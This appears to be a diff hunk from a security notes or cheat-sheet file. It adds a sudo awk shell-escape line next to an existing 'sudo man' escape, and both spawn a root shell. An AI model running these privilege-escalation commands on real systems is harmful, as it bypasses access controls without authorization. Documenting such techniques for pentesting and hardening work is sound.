@@ -88,4 +88,5 @@ https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/
   ```
   $ sudo man man
   $ !/bin/bash
+  $ sudo awk 'BEGIN {system("/bin/bash")}'
 ```
